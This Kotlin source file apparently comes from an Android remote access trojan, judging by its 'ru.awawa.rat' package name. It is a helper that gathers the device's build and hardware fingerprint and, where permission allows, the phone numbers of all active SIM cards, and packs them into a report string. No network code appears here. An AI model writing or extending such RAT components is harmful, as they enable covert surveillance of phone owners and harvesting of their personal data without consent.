package ru.awawa.rat.helper

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.provider.Telephony
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import androidx.core.app.ActivityCompat
import ru.awawa.rat.Application

object BuildInfo {

    fun getInfo(): String {
        val telephonyManager = Application.context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager?
        var numbers = ""
        if (ActivityCompat.checkSelfPermission(
                Application.context,
                Manifest.permission.READ_PHONE_STATE
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                val subscriptionManager = Application.context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager?
                subscriptionManager?.activeSubscriptionInfoList?.forEach {
                    numbers += "Number ${it.simSlotIndex}: ${it.number}\n"
                }
            } else {
                numbers = "Number 1: ${telephonyManager?.line1Number}"
            }
        }

        return "Build info:\n\tBoard: ${Build.BOARD}\n" +
                "\tBootloader: ${Build.BOOTLOADER}\n" +
                "\tBrand: ${Build.BRAND}\n" +
                "\tDevice: ${Build.DEVICE}\n" +
                "\tDisplay: ${Build.DISPLAY}\n" +
                "\tFingerprint: ${Build.FINGERPRINT}\n" +
                "\tHardware: ${Build.HARDWARE}\n" +
                "\tHost: ${Build.HOST}\n" +
                "\tID: ${Build.ID}\n" +
                "\tManufacturer: ${Build.MANUFACTURER}\n" +
                "\tModel: ${Build.MODEL}\n" +
                "\tProduct: ${Build.PRODUCT}\n" +
                "\tTags: ${Build.TAGS}\n" +
                "\tType: ${Build.TYPE}\n" +
                "\tUser: ${Build.USER}\n" +
                "\tCodename: ${Build.VERSION.CODENAME}\n" +
                "\tSDK Int: ${Build.VERSION.SDK_INT}\n" +
                "\tPhone numbers: $numbers"
    }
}